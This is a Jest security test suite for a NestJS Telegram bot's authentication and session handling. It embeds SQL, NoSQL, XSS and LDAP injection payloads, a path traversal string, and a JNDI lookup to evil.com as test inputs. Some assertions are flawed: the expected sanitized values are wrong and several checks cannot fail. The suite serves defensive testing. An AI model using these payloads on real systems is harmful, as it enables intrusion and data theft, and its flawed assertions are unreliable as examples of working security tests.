import { Test, TestingModule } from '@nestjs/testing';
import { Logger } from '@nestjs/common';
import { AuthComposer } from '../composer/auth.composer';
import { SessionService } from '../service/session.service';
import { AuthService } from '@app/feature-auth-main';
import { AuthUserService } from '@app/feature-auth-shared';
import { UserService } from '@app/feature-user-main';
import { BotContext } from '@app/feature-bot-shared';
import {
  MockBotContextFactory,
  MockTelegramUserFactory,
  MockCallbackQueryFactory,
  BotTestUtils,
} from '@app/feature-bot-shared/test/telegram-context.mock.spec';

/**
 * Security Vulnerability Testing
 *
 * Comprehensive security testing for authentication and session management
 * including injection attacks, session security, access control, data validation,
 * and protection against common attack vectors.
 */
describe('Auth Security Vulnerability Tests', () => {
  let authComposer: AuthComposer;
  let module: TestingModule;
  let mockSessionService: jest.Mocked<SessionService>;
  let mockAuthService: jest.Mocked<AuthService>;
  let mockAuthUserService: jest.Mocked<AuthUserService>;
  let mockUserService: jest.Mocked<UserService>;
  let loggerSpy: jest.SpyInstance;

  beforeEach(async () => {
    // Setup mocks with security testing focus
    mockSessionService = {
      createSession: jest.fn(),
      getSession: jest.fn(),
      updateSession: jest.fn(),
      deleteSession: jest.fn(),
      getOrCreateSession: jest.fn(),
      extendSession: jest.fn(),
      isSessionValid: jest.fn(),
      clearExpiredSessions: jest.fn(),
    } as any;

    mockAuthService = {
      auth: jest.fn(),
      validateUser: jest.fn(),
      refreshToken: jest.fn(),
      logout: jest.fn(),
      sendVerificationCode: jest.fn(),
      verifyCode: jest.fn(),
    } as any;

    mockAuthUserService = {
      findOrCreateByBot: jest.fn(),
      findOrCreateByWebAuth: jest.fn(),
      findByPlatformId: jest.fn(),
    } as any;

    mockUserService = {
      findById: jest.fn(),
      updateProfile: jest.fn(),
      getUserBalance: jest.fn(),
    } as any;

    module = await Test.createTestingModule({
      providers: [
        AuthComposer,
        { provide: SessionService, useValue: mockSessionService },
        { provide: AuthService, useValue: mockAuthService },
        { provide: AuthUserService, useValue: mockAuthUserService },
        { provide: UserService, useValue: mockUserService },
      ],
    }).compile();

    authComposer = module.get<AuthComposer>(AuthComposer);

    // Mock logger methods
    loggerSpy = jest.spyOn(Logger.prototype, 'log').mockImplementation();
    jest.spyOn(Logger.prototype, 'error').mockImplementation();
    jest.spyOn(Logger.prototype, 'debug').mockImplementation();
    jest.spyOn(Logger.prototype, 'warn').mockImplementation();
  });

  afterEach(async () => {
    if (module) {
      await module.close();
    }

    jest.clearAllMocks();
  });

  describe('Injection Attack Prevention', () => {
    it('should prevent SQL injection through user input', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // SQL injection payloads
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM sessions WHERE '1'='1'; --",
        "' UNION SELECT * FROM admin_users --",
        "'; INSERT INTO users (admin) VALUES (true); --",
        "' OR 1=1; UPDATE users SET admin=true; --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const maliciousUser = MockTelegramUserFactory.createUser({
          first_name: payload,
          last_name: payload,
          username: payload.replace(/[^a-zA-Z0-9_]/g, ''), // Username can't contain special chars
        });

        const maliciousCtx = MockBotContextFactory.createBasicContext(maliciousUser);

        // Mock that user doesn't exist (would trigger creation)
        mockAuthUserService.findByPlatformId.mockResolvedValue(null);
        mockAuthService.auth.mockResolvedValue({
          success: true,
          user: { id: 'test-user', telegramId: maliciousUser.id.toString() },
          token: 'test-token',
        });

        mockSessionService.createSession.mockResolvedValue({
          userId: maliciousUser.id.toString(),
          data: {} as any,
          createdAt: new Date(),
          updatedAt: new Date(),
          expiresAt: new Date(Date.now() + 86400000),
          metadata: {},
        });

        const quickRegCallback = MockCallbackQueryFactory.createAuthCallbackQuery(
          'quick_register',
          undefined,
          maliciousUser,
        );

        const callbackCtx = MockBotContextFactory.createCallbackContext(quickRegCallback);

        // Should handle malicious input without crashing
        await authComposer['handleQuickRegister'](callbackCtx);

        // Verify that auth service was called with sanitized data
        expect(mockAuthService.auth).toHaveBeenCalledWith({
          userData: {
            id: maliciousUser.id.toString(),
            firstName: payload, // Should be passed as-is but handled safely by lower layers
            lastName: payload,
            username: maliciousUser.username,
            languageCode: maliciousUser.language_code,
          },
          platformType: 'TelegramBot',
          ip: '0.0.0.0',
        });
      }
    });

    it('should prevent NoSQL injection through session data', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // NoSQL injection payloads
      const nosqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'this.username == this.password' },
        { $or: [{ admin: true }, { role: 'admin' }] },
      ];

      for (const payload of nosqlPayloads) {
        mockSessionService.updateSession.mockResolvedValue({
          userId: ctx.from!.id.toString(),
          data: {
            cache: { maliciousData: payload },
            conversationState: {
              currentStep: 'test',
              availableSteps: [],
              context: {},
              isActive: true,
              startedAt: new Date(),
            },
            preferences: { language: 'en' },
            navigationState: { currentLocation: 'test', breadcrumb: [], history: [], metadata: {} },
            formData: {},
            custom: {},
          },
          createdAt: new Date(),
          updatedAt: new Date(),
          expiresAt: new Date(Date.now() + 86400000),
          metadata: {},
        });

        // Should not crash when handling NoSQL injection attempts
        await expect(async () => {
          await authComposer['updateAuthState'](ctx.from!.id.toString(), 'authenticated' as any);
        }).not.toThrow();
      }
    });

    it('should prevent XSS through callback data', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // XSS payloads
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        "'-alert(String.fromCharCode(88,83,83))-'",
      ];

      for (const payload of xssPayloads) {
        const xssCallback = MockCallbackQueryFactory.createCallbackQuery(
          `auth:register:${payload}`,
          ctx.from,
          ctx.message,
        );

        const callbackCtx = MockBotContextFactory.createCallbackContext(xssCallback);

        // Should handle XSS attempts safely
        await expect(async () => {
          // Simulate callback parsing that would be vulnerable to XSS
          const parts = xssCallback.data!.split(':');
          if (parts.length >= 3) {
            const method = parts[2]; // This would contain the XSS payload
            // Should be properly escaped/sanitized
            expect(method).toBe(payload); // Raw payload should be preserved for proper handling
          }
        }).not.toThrow();
      }
    });

    it('should prevent LDAP injection', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // LDAP injection payloads
      const ldapPayloads = ['*)(uid=*', '*)(|(uid=*', '*)(&(uid=*', '*)(!(&(uid=*', '*))%00', '*))(|(uid=*'];

      for (const payload of ldapPayloads) {
        const ldapUser = MockTelegramUserFactory.createUser({
          username: `user${payload}`.replace(/[^a-zA-Z0-9_]/g, '_'), // Sanitize for valid username
          first_name: payload,
        });

        mockAuthUserService.findByPlatformId.mockImplementation(async (userId) => {
          // Simulate LDAP query - should not be vulnerable
          if (userId.includes('*') || userId.includes('(') || userId.includes(')')) {
            // Proper LDAP implementations should escape these
            return null;
          }

          return null;
        });

        await authComposer['getCurrentAuthState'](MockBotContextFactory.createBasicContext(ldapUser));

        // Should handle LDAP injection attempts safely
        expect(mockAuthUserService.findByPlatformId).toHaveBeenCalledWith(ldapUser.id.toString());
      }
    });
  });

  describe('Session Security', () => {
    it('should prevent session fixation attacks', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // Simulate attacker trying to set specific session ID
      const attackerSessionId = 'attacker-controlled-session-id';

      mockSessionService.getSession.mockResolvedValue({
        userId: ctx.from!.id.toString(),
        data: {
          conversationState: {
            currentStep: 'authenticated',
            availableSteps: [],
            context: {},
            isActive: true,
            startedAt: new Date(),
          },
          preferences: { language: 'en' },
          navigationState: { currentLocation: 'main', breadcrumb: [], history: [], metadata: {} },
          formData: {},
          cache: {},
          custom: {},
        },
        createdAt: new Date(),
        updatedAt: new Date(),
        expiresAt: new Date(Date.now() + 86400000),
        metadata: { sessionId: attackerSessionId },
      });

      // Session ID should be generated by the service, not controlled by user
      const authState = await authComposer['getCurrentAuthState'](ctx);

      // Verify session handling doesn't rely on user-controllable session IDs
      expect(authState).toBeDefined();
      expect(mockSessionService.getSession).toHaveBeenCalledWith(ctx.from!.id.toString());
    });

    it('should prevent session hijacking through predictable session IDs', async () => {
      const users = Array(10)
        .fill(null)
        .map((_, i) => MockTelegramUserFactory.createUser({ id: 1000000 + i }));

      const sessionIds: string[] = [];

      for (const user of users) {
        const ctx = MockBotContextFactory.createBasicContext(user);

        mockSessionService.createSession.mockImplementation(async (userId, data, ttl) => {
          // Simulate session ID generation
          const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
          sessionIds.push(sessionId);

          return {
            userId,
            data: data || ({} as any),
            createdAt: new Date(),
            updatedAt: new Date(),
            expiresAt: new Date(Date.now() + (ttl || 86400) * 1000),
            metadata: { sessionId },
          };
        });

        await authComposer['getCurrentAuthState'](ctx);
      }

      // Session IDs should not be predictable
      const uniqueIds = new Set(sessionIds);
      expect(uniqueIds.size).toBe(sessionIds.length); // All should be unique

      // Check that session IDs are sufficiently random
      for (let i = 0; i < sessionIds.length - 1; i++) {
        for (let j = i + 1; j < sessionIds.length; j++) {
          // No two session IDs should be similar (simple check)
          expect(sessionIds[i]).not.toBe(sessionIds[j]);
        }
      }
    });

    it('should prevent session data tampering', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // Simulate tampered session data
      const tamperedSession = {
        userId: ctx.from!.id.toString(),
        data: {
          conversationState: {
            currentStep: 'authenticated',
            availableSteps: [],
            context: {},
            isActive: true,
            startedAt: new Date(),
          },
          preferences: { language: 'en' },
          navigationState: { currentLocation: 'admin', breadcrumb: [], history: [], metadata: {} }, // Tampered location
          formData: {},
          cache: { role: 'admin', permissions: ['all'] }, // Tampered privileges
          custom: { isAdmin: true }, // Tampered admin flag
        },
        createdAt: new Date(),
        updatedAt: new Date(),
        expiresAt: new Date(Date.now() + 86400000),
        metadata: {},
      };

      mockSessionService.getSession.mockResolvedValue(tamperedSession);

      // Should handle tampered session data safely
      const authState = await authComposer['getCurrentAuthState'](ctx);

      // Should not trust client-side session data for authorization
      expect(authState).toBeDefined();
      // Authorization should come from server-side validation, not session data
    });

    it('should implement proper session timeout handling', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // Test various session timeout scenarios
      const timeoutScenarios = [
        { description: 'recently expired', expiresAt: new Date(Date.now() - 1000) }, // 1 second ago
        { description: 'long expired', expiresAt: new Date(Date.now() - 86400000) }, // 1 day ago
        { description: 'far future', expiresAt: new Date(Date.now() + 86400000) }, // 1 day from now
      ];

      for (const scenario of timeoutScenarios) {
        const session = {
          userId: ctx.from!.id.toString(),
          data: {
            conversationState: {
              currentStep: 'authenticated',
              availableSteps: [],
              context: {},
              isActive: true,
              startedAt: new Date(),
            },
            preferences: { language: 'en' },
            navigationState: { currentLocation: 'main', breadcrumb: [], history: [], metadata: {} },
            formData: {},
            cache: {},
            custom: {},
          },
          createdAt: new Date(),
          updatedAt: new Date(),
          expiresAt: scenario.expiresAt,
          metadata: {},
        };

        mockSessionService.getSession.mockResolvedValue(session);
        mockSessionService.isSessionValid.mockImplementation((sess) => {
          return sess.expiresAt > new Date();
        });

        if (scenario.expiresAt <= new Date()) {
          // Expired sessions should be cleaned up
          mockSessionService.deleteSession.mockResolvedValue(undefined);
        }

        const authState = await authComposer['getCurrentAuthState'](ctx);

        if (scenario.expiresAt <= new Date()) {
          // Expired sessions should result in unauthenticated state
          expect(authState).toBe('unauthenticated');
        } else {
          // Valid sessions should work normally
          expect(authState).toBeDefined();
        }
      }
    });
  });

  describe('Access Control and Authorization', () => {
    it('should prevent horizontal privilege escalation', async () => {
      const user1 = MockTelegramUserFactory.createUser({ id: 123456 });
      const user2 = MockTelegramUserFactory.createUser({ id: 789012 });

      const ctx1 = MockBotContextFactory.createBasicContext(user1);
      const ctx2 = MockBotContextFactory.createBasicContext(user2);

      // User 1 creates session
      mockSessionService.createSession.mockResolvedValue({
        userId: user1.id.toString(),
        data: {
          conversationState: {
            currentStep: 'authenticated',
            availableSteps: [],
            context: {},
            isActive: true,
            startedAt: new Date(),
          },
          preferences: { language: 'en' },
          navigationState: { currentLocation: 'main', breadcrumb: [], history: [], metadata: {} },
          formData: {},
          cache: { userSpecificData: 'sensitive_info_user1' },
          custom: {},
        },
        createdAt: new Date(),
        updatedAt: new Date(),
        expiresAt: new Date(Date.now() + 86400000),
        metadata: {},
      });

      // User 2 should not be able to access User 1's session
      mockSessionService.getSession.mockImplementation(async (userId) => {
        if (userId === user1.id.toString()) {
          return {
            userId: user1.id.toString(),
            data: { cache: { userSpecificData: 'sensitive_info_user1' } } as any,
            createdAt: new Date(),
            updatedAt: new Date(),
            expiresAt: new Date(Date.now() + 86400000),
            metadata: {},
          };
        }

        return null; // User 2 has no session
      });

      // User 1 can access their own session
      const user1State = await authComposer['getCurrentAuthState'](ctx1);
      expect(user1State).toBeDefined();

      // User 2 cannot access User 1's session
      const user2State = await authComposer['getCurrentAuthState'](ctx2);
      expect(user2State).toBe('unauthenticated');

      // Verify session isolation
      expect(mockSessionService.getSession).toHaveBeenCalledWith(user1.id.toString());
      expect(mockSessionService.getSession).toHaveBeenCalledWith(user2.id.toString());
    });

    it('should prevent vertical privilege escalation', async () => {
      const regularUser = MockTelegramUserFactory.createUser({ id: 123456 });
      const ctx = MockBotContextFactory.createBasicContext(regularUser);

      // Regular user tries to escalate privileges
      const escalationAttempts = [
        { cache: { role: 'admin' } },
        { cache: { permissions: ['admin_access'] } },
        { custom: { isAdmin: true } },
        { formData: { userType: 'administrator' } },
      ];

      for (const attempt of escalationAttempts) {
        mockSessionService.updateSession.mockResolvedValue({
          userId: regularUser.id.toString(),
          data: {
            conversationState: {
              currentStep: 'authenticated',
              availableSteps: [],
              context: {},
              isActive: true,
              startedAt: new Date(),
            },
            preferences: { language: 'en' },
            navigationState: { currentLocation: 'main', breadcrumb: [], history: [], metadata: {} },
            formData: {},
            cache: {},
            custom: {},
            ...attempt,
          },
          createdAt: new Date(),
          updatedAt: new Date(),
          expiresAt: new Date(Date.now() + 86400000),
          metadata: {},
        });

        // Privilege escalation should not be possible through session manipulation
        await authComposer['updateAuthState'](regularUser.id.toString(), 'authenticated' as any);

        // Authorization should come from server-side validation, not session data
        expect(mockSessionService.updateSession).toHaveBeenCalled();
      }
    });

    it('should validate user permissions correctly', async () => {
      const users = [
        { user: MockTelegramUserFactory.createUser({ id: 111111 }), expectedAccess: false },
        { user: MockTelegramUserFactory.createUser({ id: 222222 }), expectedAccess: true },
        { user: MockTelegramUserFactory.createUser({ id: 333333 }), expectedAccess: false },
      ];

      for (const { user, expectedAccess } of users) {
        const ctx = MockBotContextFactory.createBasicContext(user);

        // Mock user validation based on ID
        mockAuthUserService.findByPlatformId.mockImplementation(async (userId) => {
          if (userId === '222222') {
            return { id: 'user-222222', telegramId: userId, isActive: true };
          }

          return null;
        });

        mockSessionService.getSession.mockImplementation(async (userId) => {
          if (userId === '222222') {
            return {
              userId,
              data: {
                conversationState: {
                  currentStep: 'authenticated',
                  availableSteps: [],
                  context: {},
                  isActive: true,
                  startedAt: new Date(),
                },
                preferences: { language: 'en' },
                navigationState: { currentLocation: 'main', breadcrumb: [], history: [], metadata: {} },
                formData: {},
                cache: {},
                custom: {},
              },
              createdAt: new Date(),
              updatedAt: new Date(),
              expiresAt: new Date(Date.now() + 86400000),
              metadata: {},
            };
          }

          return null;
        });

        const authState = await authComposer['getCurrentAuthState'](ctx);

        if (expectedAccess) {
          expect(authState).toBe('authenticated');
        } else {
          expect(authState).toBe('unauthenticated');
        }
      }
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate and sanitize user input data', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // Test various malicious inputs
      const maliciousInputs = [
        { input: '<script>alert("xss")</script>', expected: 'script_alert_xss_script' },
        { input: "'; DROP TABLE users; --", expected: '_DROP_TABLE_users___' },
        { input: '../../etc/passwd', expected: '___etc_passwd' },
        { input: '${jndi:ldap://evil.com/a}', expected: '_jndi_ldap___evil_com_a_' },
        { input: 'javascript:void(0)', expected: 'javascript_void_0_' },
      ];

      for (const { input, expected } of maliciousInputs) {
        const maliciousUser = MockTelegramUserFactory.createUser({
          first_name: input,
          last_name: input,
          username: input.replace(/[^a-zA-Z0-9_]/g, '_'), // Basic sanitization for username
        });

        const maliciousCtx = MockBotContextFactory.createBasicContext(maliciousUser);

        // Should handle malicious input safely
        const menu = await authComposer.composeWelcomeMenu(maliciousCtx);

        expect(menu).toBeDefined();
        expect(menu.title).toContain('Welcome to MotivBuy');

        // Username should be sanitized
        expect(maliciousUser.username).toBe(expected);
      }
    });

    it('should prevent buffer overflow attacks', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // Create extremely large inputs
      const oversizedInputs = [
        'A'.repeat(10000), // 10KB string
        'B'.repeat(100000), // 100KB string
        'C'.repeat(1000000), // 1MB string
      ];

      for (const oversizedInput of oversizedInputs) {
        const oversizedUser = MockTelegramUserFactory.createUser({
          first_name: oversizedInput,
          last_name: oversizedInput,
          username: 'oversized_user',
        });

        const oversizedCtx = MockBotContextFactory.createBasicContext(oversizedUser);

        // Should handle oversized input without crashing
        await expect(async () => {
          await authComposer.composeWelcomeMenu(oversizedCtx);
        }).not.toThrow();

        // Memory usage should not explode
        const memUsage = process.memoryUsage().heapUsed;
        expect(memUsage).toBeLessThan(100 * 1024 * 1024); // Less than 100MB
      }
    });

    it('should validate callback data format strictly', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // Test malformed callback data
      const malformedCallbacks = [
        '', // Empty
        'invalid', // Missing colon
        '::', // Empty parts
        'auth', // Missing action
        'auth:', // Missing action value
        'auth:action:', // Missing method value
        'auth:action:method:extra:parts:too:many', // Too many parts
        'auth\naction\nmethod', // Newlines
        'auth\taction\tmethod', // Tabs
        'auth action method', // Spaces instead of colons
      ];

      for (const malformedData of malformedCallbacks) {
        const malformedCallback = MockCallbackQueryFactory.createCallbackQuery(malformedData, ctx.from, ctx.message);

        const callbackCtx = MockBotContextFactory.createCallbackContext(malformedCallback);

        // Should handle malformed callback data gracefully
        await expect(async () => {
          // Simulate callback parsing
          if (malformedData && malformedData.includes(':')) {
            const parts = malformedData.split(':');
            if (parts.length >= 2 && parts.length <= 4) {
              // Valid format
            } else {
              // Invalid format - should be handled gracefully
            }
          }
        }).not.toThrow();
      }
    });
  });

  describe('Timing Attack Prevention', () => {
    it('should prevent timing attacks on user existence checks', async () => {
      const existingUserId = '123456789';
      const nonExistentUserId = '987654321';

      // Mock responses with realistic delays
      mockAuthUserService.findByPlatformId.mockImplementation(async (userId) => {
        // Simulate database lookup time regardless of result
        await new Promise((resolve) => setTimeout(resolve, 50 + Math.random() * 50));

        if (userId === existingUserId) {
          return { id: 'user-123', telegramId: userId, isActive: true };
        }

        return null;
      });

      const existingUserCtx = MockBotContextFactory.createBasicContext(
        MockTelegramUserFactory.createUser({ id: parseInt(existingUserId) }),
      );

      const nonExistentUserCtx = MockBotContextFactory.createBasicContext(
        MockTelegramUserFactory.createUser({ id: parseInt(nonExistentUserId) }),
      );

      // Measure timing for both scenarios
      const measurements: number[] = [];

      for (let i = 0; i < 10; i++) {
        // Test existing user
        const start1 = Date.now();
        await authComposer['getCurrentAuthState'](existingUserCtx);
        const time1 = Date.now() - start1;

        // Test non-existent user
        const start2 = Date.now();
        await authComposer['getCurrentAuthState'](nonExistentUserCtx);
        const time2 = Date.now() - start2;

        measurements.push(Math.abs(time1 - time2));
      }

      // Timing difference should be minimal (less than 20ms average)
      const avgTimingDiff = measurements.reduce((a, b) => a + b, 0) / measurements.length;
      expect(avgTimingDiff).toBeLessThan(20);
    });

    it('should prevent timing attacks on authentication validation', async () => {
      const validCredentials = { userId: '123456', token: 'valid_token' };
      const invalidCredentials = { userId: '123456', token: 'invalid_token' };

      mockAuthService.validateUser.mockImplementation(async (creds) => {
        // Simulate constant-time comparison
        await new Promise((resolve) => setTimeout(resolve, 100 + Math.random() * 50));

        if (creds.token === validCredentials.token) {
          return { id: 'user-123', isValid: true };
        }

        return null;
      });

      const validCtx = MockBotContextFactory.createBasicContext();
      const invalidCtx = MockBotContextFactory.createBasicContext();

      const timingDifferences: number[] = [];

      for (let i = 0; i < 5; i++) {
        // Test valid credentials
        const start1 = Date.now();
        try {
          await mockAuthService.validateUser(validCredentials);
        } catch (e) {}

        const time1 = Date.now() - start1;

        // Test invalid credentials
        const start2 = Date.now();
        try {
          await mockAuthService.validateUser(invalidCredentials);
        } catch (e) {}

        const time2 = Date.now() - start2;

        timingDifferences.push(Math.abs(time1 - time2));
      }

      // Timing differences should be minimal
      const maxTimingDiff = Math.max(...timingDifferences);
      expect(maxTimingDiff).toBeLessThan(50); // Less than 50ms difference
    });
  });

  describe('Data Leakage Prevention', () => {
    it('should not leak sensitive data in error messages', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // Mock various error scenarios that might leak data
      const sensitiveErrors = [
        new Error('Database connection failed: password=secret123'),
        new Error('JWT validation failed: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...'),
        new Error('Redis key not found: session:user:123456:secret_data'),
        new Error('SQL query failed: SELECT * FROM users WHERE password="hidden"'),
      ];

      for (const error of sensitiveErrors) {
        mockSessionService.getSession.mockRejectedValue(error);

        await authComposer['getCurrentAuthState'](ctx);

        // Error should be logged but not exposed to user
        expect(Logger.prototype.error).toHaveBeenCalledWith(
          'Error getting auth state',
          expect.objectContaining({
            error: error.message,
          }),
        );

        // User should not see sensitive error details
        // (This would be tested in actual implementation)
      }
    });

    it('should not expose internal system information', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // Mock system information that shouldn't be exposed
      const systemErrors = [
        new Error('Connection timeout: redis://internal-cache:6379'),
        new Error('Database error: postgresql://user:pass@db.internal:5432/app'),
        new Error('Service unavailable: auth-service.cluster.local:8080'),
        new Error('File not found: /etc/app/secrets/jwt.key'),
      ];

      for (const error of systemErrors) {
        mockAuthService.auth.mockRejectedValue(error);

        const quickRegCallback = MockCallbackQueryFactory.createAuthCallbackQuery(
          'quick_register',
          undefined,
          ctx.from,
        );

        const callbackCtx = MockBotContextFactory.createCallbackContext(quickRegCallback);

        mockAuthUserService.findByPlatformId.mockResolvedValue(null);

        await authComposer['handleQuickRegister'](callbackCtx);

        // Internal error details should not be exposed to user
        expect(callbackCtx.reply).toHaveBeenCalledWith(
          expect.stringContaining('Registration failed'),
          expect.any(Object),
        );

        // Should not contain internal system details
        const replyArgs = (callbackCtx.reply as jest.Mock).mock.calls[0];
        expect(replyArgs[0]).not.toMatch(/redis:\/\/|postgresql:\/\/|\.internal|\/etc\//);
      }
    });

    it('should sanitize stack traces in production', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // Mock error with detailed stack trace
      const errorWithStack = new Error('Test error');
      errorWithStack.stack = `Error: Test error
        at Object.findUser (/app/src/services/auth.service.js:123:45)
        at Object.authenticate (/app/src/controllers/auth.controller.js:67:89)
        at /app/node_modules/express/lib/router/layer.js:95:5
        at /app/src/internal/secret-file.js:123:45`;

      mockSessionService.getSession.mockRejectedValue(errorWithStack);

      await authComposer['getCurrentAuthState'](ctx);

      // Stack trace should be logged for debugging but not exposed
      expect(Logger.prototype.error).toHaveBeenCalled();

      // Verify that stack trace contains sensitive paths (for test purposes)
      expect(errorWithStack.stack).toContain('/app/src/internal/secret-file.js');
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should implement proper rate limiting for authentication attempts', async () => {
      const ctx = MockBotContextFactory.createBasicContext();

      // Simulate rapid authentication attempts
      const attempts = Array(20)
        .fill(null)
        .map(() => MockCallbackQueryFactory.createAuthCallbackQuery('quick_register', undefined, ctx.from));

      mockAuthUserService.findByPlatformId.mockResolvedValue(null);

      let attemptCount = 0;
      mockAuthService.auth.mockImplementation(async () => {
        attemptCount++;
        if (attemptCount > 5) {
          throw new Error('Rate limit exceeded: too many authentication attempts');
        }

        return { success: true, user: { id: 'user-123' }, token: 'token-123' };
      });

      // Process attempts rapidly
      const results = await Promise.allSettled(
        attempts.map(async (callback) => {
          const callbackCtx = MockBotContextFactory.createCallbackContext(callback);

          return authComposer['handleQuickRegister'](callbackCtx);
        }),
      );

      // Some attempts should be rate limited
      const rejected = results.filter((r) => r.status === 'rejected');
      expect(rejected.length).toBeGreaterThan(0);
    });

    it('should protect against session enumeration attacks', async () => {
      // Attempt to enumerate valid session IDs
      const sessionIds = Array(100)
        .fill(null)
        .map((_, i) => `session_${i}`);

      for (const sessionId of sessionIds) {
        const ctx = MockBotContextFactory.createBasicContext(
          MockTelegramUserFactory.createUser({ id: parseInt(sessionId.replace('session_', '')) || 999999 }),
        );

        mockSessionService.getSession.mockImplementation(async (userId) => {
          // Should not reveal whether session exists through timing or response differences
          await new Promise((resolve) => setTimeout(resolve, 50)); // Constant delay

          return null; // Always return null to prevent enumeration
        });

        const authState = await authComposer['getCurrentAuthState'](ctx);
        expect(authState).toBe('unauthenticated');
      }

      // All requests should have similar behavior regardless of session existence
      expect(mockSessionService.getSession).toHaveBeenCalledTimes(100);
    });

    it('should protect against resource exhaustion attacks', async () => {
      const initialMemory = process.memoryUsage().heapUsed;

      // Simulate many concurrent requests
      const concurrentRequests = Array(50)
        .fill(null)
        .map((_, i) => {
          const user = MockTelegramUserFactory.createUser({ id: 1000000 + i });
          const ctx = MockBotContextFactory.createBasicContext(user);

          return authComposer.composeWelcomeMenu(ctx);
        });

      await Promise.all(concurrentRequests);

      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;

      // Memory increase should be reasonable (less than 50MB)
      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);
    });
  });
});
